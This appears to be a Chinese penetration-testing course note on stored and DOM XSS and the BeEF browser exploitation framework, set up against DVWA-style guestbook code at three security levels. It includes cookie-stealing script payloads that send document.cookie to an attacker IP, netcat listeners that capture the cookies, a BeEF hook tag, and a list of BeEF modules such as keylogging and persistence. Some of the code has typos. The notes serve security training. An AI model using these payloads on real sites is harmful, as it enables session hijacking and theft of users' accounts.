@@ -1,0 +1,193 @@
+课时99 存储型XSS和BEEF浏览器攻击框架
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃存储型XSS                                                             ┃
+┃    长期存储于服务器端                                                ┃
+┃    每次用于访问都会被执行javascript脚本                              ┃
+┃Name:客户端表单长度限制                                               ┃
+┃    客户端、截断代理                                                  ┃
+┃<script src=http://1.1.1.1/a.js></script>                             ┃
+┃a.js源码                                                              ┃
+┃    var img = new Image();                                            ┃
+┃    img.src = "http://1.1.1.1:88/cookies.php?cookie="+documnet.cookie;┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@R:~# netstat -pantu | grep 80
+tcp        0      0 127.0.0.1:80            0.0.0.0:*         LISTEN       771/gsad
+tcp        0      0 192.168.1.102:34212     140.98.195.27.80  ESTABLISHED  2840/wget
+tcp6       0      127.0.0.1:8080            :::*              LISTEN       2387/java
+
+root@R:~# kill 771
+
+root@R:~# service apache2 start
+
+root@R:~# cd /var/www/html/
+
+root@R:/var/www/html# gedit a.js
+var img = new Image();
+img.src = "http://192.168.1.102:88/cookies.php?cookie="+documnet.cookie;
+
+root@R:~# nc -nlvp 88
+
+----------------------------------------------------------------------
+低安全代码
+<?php
+
+if(isset($_POST['btnSign']))
+{
+
+    $message = trim($_POST['mixMessage']);
+    $name    = trim($_POST['txtName]);
+
+    // Sanitize message input
+    $message = stripslashes($message);
+    $message = mysql_real_escape_string($message);
+
+    // Sanitize name input
+    $name = mysql_real_escape_string($name);
+
+    $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
+
+    $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
+}
+
+?>
+---------------------------------------------------------------------------
+中安全代码
+<?php
+
+if(isset($_POST['btnSign']))
+{
+
+    $message = trim($_POST['mixMessage']);
+    $name    = trim($_POST['txtName]);
+
+    // Sanitize message input
+    $message = trim(strip_tags(addslashed($message)));
+    $message = mysql_real_escape_string($message);
+    $message = htmlspecialchars($message);
+
+    // Sanitize name input
+    $name = str_replace('<script>','',$name);
+    $name = mysql_real_escape_string($name);
+
+    $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
+
+    $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
+}
+
+?>
+----------------------------------------------------------------------------------
+高安全代码
+<?php
+
+if(isset($_POST['btnSign']))
+{
+
+    $message = trim($_POST['mixMessage']);
+    $name    = trim($_POST['txtName]);
+
+    // Sanitize message input
+    $message = stripslashes($message);
+    $message = mysql_real_escape_string($message);
+    $message = htmlspecialchars($message);
+
+    // Sanitize name input
+    $name = str_replace('<script>','',$name);
+    $name = mysql_real_escape_string($name);
+    $name = htmlspecialchars($name);
+
+    $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
+
+    $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
+}
+
+?>
+----------------------------------------------------------------------------------
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃XSS                                                 ┃
+┃DOM型XSS                                            ┃
+┃    一套JS和其他语言可调用的标准的API               ┃
+┃Page                 Document objedct               ┃
+┃Element1             Obj1                           ┃
+┃Element2             Obj2  ┌Properties─Value┬Get ┃
+┃                           │                 └Set ┃
+┃Element3             Obj3─┼Methods─Action┬Add   ┃
+┃                           │               └Del   ┃
+┃                           └Event                  ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃XSS                                                                       ┃
+┃DOM型XSS                                                                  ┃
+┃    <script>var                                                           ┃
+┃    img=document.createElememt("img");img.src="http://192.168.1.102:88/log┃
+┃    ?"+escape(document.cookie);</script>                                  ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@R:~# vi 1
+<script>var img=document.createElememt("img");img.src="http://192.168.1.102:88/log?"+escape(document.cookie);</script>
+
+root@R:~# nc -nlvp 88
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃BEEF                                                ┃
+┃浏览器攻击面                                        ┃
+┃    应用普遍转移到B/S架构，浏览器成为统一客户端程序 ┃
+┃    结合社会工程学方法对浏览器进行攻击              ┃
+┃    攻击浏览器用户                                  ┃
+┃    通过注入的JS脚本，利用浏览器攻击其他网站        ┃
+┃Beff(Brower exploitation framework)                 ┃
+┃    生成、交付palyload                              ┃
+┃    Ruby语言编写                                    ┃
+┃    服务器端：管理hooked客户端                      ┃
+┃    客户端：运行与客户端浏览器的Javascript脚本(hook)┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━╋
+┃BEEF                                ┃
+┃攻击手段                            ┃
+┃    利用网站xss漏洞实现攻击         ┃
+┃    诱使客户端访问含有hook的伪造站点┃
+┃    结合中介人攻击注入hook脚本      ┃
+┃常见用途                            ┃
+┃    键盘记录器                      ┃
+┃    网盘扫描                        ┃
+┃    浏览器信息收集                  ┃
+┃    绑定shell                       ┃
+┃    与metasploit集成                ┃
+╋━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃BEEF                                                            ┃                               
+┃演示页面：http://<IP_BeEF_Server>:3000/demos/basic.html         ┃
+┃Details:                                                        ┃
+┃    浏览器、插件版本信息；操作系统信息                          ┃
+┃Logs:                                                           ┃
+┃    浏览器工作：焦点变化、鼠标点击、信息输入                    ┃
+┃Commands：命令模块                                              ┃
+┃    绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见┃
+┃    红色模块：表示模块不适用于当前用户，有些红色模块也可正常执行┃
+┃    橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）   ┃
+┃    灰色模块：模块末在目标浏览器上测试过                        ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+beef xss framework
+[*] Please wait as BeEF services are started.
+[*] You might need to refresh your browser once it opens.
+[*] UI URL: http://127.0.0.1:3000/ui/panel
+[*] Hook: <script src="http://<IP>:3000/hook.js"></script>
+[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>
+
+192.168.1.102:3000/hook.js
+
+╋━━━━━━━━╋
+┃BEEF            ┃
+┃主要模块        ┃
+┃    Browsers    ┃
+┃    Exploits    ┃
+┃    Host        ┃
+┃    Persistence ┃
+┃    Network     ┃
+╋━━━━━━━━╋
